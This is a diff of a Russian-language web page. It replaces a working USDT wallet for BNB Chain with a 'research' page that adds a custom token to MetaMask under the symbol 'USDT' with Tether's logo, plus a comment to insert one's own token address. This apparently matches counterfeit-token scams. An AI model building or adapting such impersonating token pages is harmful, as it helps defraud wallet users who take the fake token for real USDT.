@@ -1,177 +1,34 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8"/>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>USDT Wallet - Send & View</title>
-  <style>
-    body {
-      background: #111;
-      color: #fff;
-      font-family: 'Segoe UI', sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      margin: 0;
-    }
-
-    .wallet {
-      background: #1d1d2b;
-      border-radius: 16px;
-      box-shadow: 0 0 15px rgba(0,255,180,0.2);
-      padding: 30px;
-      text-align: center;
-      width: 360px;
-    }
-
-    .wallet img {
-      width: 60px;
-    }
-
-    h1 {
-      margin: 10px 0;
-      font-size: 22px;
-      color: #26a17b;
-    }
-
-    .address {
-      font-size: 13px;
-      color: #aaa;
-      word-break: break-all;
-    }
-
-    .balance {
-      font-size: 36px;
-      font-weight: bold;
-      color: #00ffc4;
-      margin: 20px 0 10px;
-    }
-
-    .coin {
-      color: #ccc;
-    }
-
-    input, button {
-      width: 100%;
-      padding: 10px;
-      margin-top: 10px;
-      border-radius: 8px;
-      font-size: 16px;
-    }
-
-    input {
-      border: 1px solid #444;
-      background: #222;
-      color: #fff;
-    }
-
-    button {
-      background: #26a17b;
-      color: white;
-      border: none;
-      cursor: pointer;
-    }
-
-    button:hover {
-      background: #2bdc9d;
-    }
-
-    .status {
-      margin-top: 15px;
-      font-size: 14px;
-      color: #aaa;
-    }
-  </style>
+  <meta charset="UTF-8">
+  <title>USDT Research Wallet</title>
 </head>
-<body>
+<body style="text-align: center; font-family: sans-serif; padding-top: 50px;">
+  <h1>🔬 Исследовательский токен USDT</h1>
+  <button onclick="addCustomToken()">📥 Добавить токен в MetaMask</button>
 
-<div class="wallet">
-  <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="USDT">
-  <h1>USDT Wallet</h1>
-  <div class="address" id="walletAddress">Not connected</div>
-  <div class="balance" id="balance">0.00</div>
-  <div class="coin">USDT (BNB Chain)</div>
+  <script>
+    async function addCustomToken() {
+      const wasAdded = await window.ethereum.request({
+        method: 'wallet_watchAsset',
+        params: {
+          type: 'ERC20',
+          options: {
+            address: '0x1111111111111111111111111111111111111111', // 🔁 сюда вставь свой токен-адрес
+            symbol: 'USDT',
+            decimals: 18,
+            image: 'https://cryptologos.cc/logos/tether-usdt-logo.png' // можно заменить на свою иконку
+          },
+        },
+      });
 
-  <input type="text" id="recipient" placeholder="Адрес получателя">
-  <input type="number" id="amount" placeholder="Сумма USDT" min="0" step="0.01">
-  <button onclick="sendUSDT()">🚀 Отправить USDT</button>
-  <button onclick="connect()">🔌 Обновить баланс</button>
-
-  <div class="status" id="status"></div>
-</div>
-
-<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
-<script>
-  const USDT_BSC_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
-  const USDT_ABI = [
-    "function balanceOf(address owner) view returns (uint256)",
-    "function transfer(address to, uint amount) returns (bool)",
-    "function decimals() view returns (uint8)"
-  ];
-
-  let provider, signer, contract, decimals;
-
-  async function connect() {
-    if (!window.ethereum) {
-      alert("Установите MetaMask!");
-      return;
-    }
-
-    provider = new ethers.providers.Web3Provider(window.ethereum);
-    await provider.send("eth_requestAccounts", []);
-    signer = provider.getSigner();
-    const address = await signer.getAddress();
-
-    document.getElementById("walletAddress").textContent = address;
-
-    // Проверка сети
-    const { chainId } = await provider.getNetwork();
-    if (chainId !== 56) {
-      try {
-        await window.ethereum.request({
-          method: "wallet_switchEthereumChain",
-          params: [{ chainId: "0x38" }]
-        });
-      } catch (e) {
-        alert("Ошибка при переключении на BNB Smart Chain");
-        return;
+      if (wasAdded) {
+        alert('✅ Токен добавлен в MetaMask!');
+      } else {
+        alert('❌ Пользователь отменил добавление.');
       }
     }
-
-    contract = new ethers.Contract(USDT_BSC_CONTRACT, USDT_ABI, signer);
-    decimals = await contract.decimals();
-
-    const balance = await contract.balanceOf(address);
-    const formatted = ethers.utils.formatUnits(balance, decimals);
-    document.getElementById("balance").textContent = parseFloat(formatted).toFixed(2);
-  }
-
-  async function sendUSDT() {
-    const to = document.getElementById("recipient").value;
-    const amount = document.getElementById("amount").value;
-    const status = document.getElementById("status");
-
-    if (!to || !amount) {
-      status.textContent = "Введите адрес и сумму";
-      return;
-    }
-
-    try {
-      const parsedAmount = ethers.utils.parseUnits(amount, decimals);
-      const tx = await contract.transfer(to, parsedAmount);
-      status.textContent = "⏳ Отправка... Ждём подтверждения...";
-      await tx.wait();
-      status.textContent = "✅ Успешно отправлено!";
-      connect(); // Обновить баланс
-    } catch (err) {
-      console.error(err);
-      status.textContent = "❌ Ошибка отправки: " + (err?.message || "неизвестно");
-    }
-  }
-
-  connect(); // подключаем при загрузке
-</script>
-
+  </script>
 </body>
 </html>
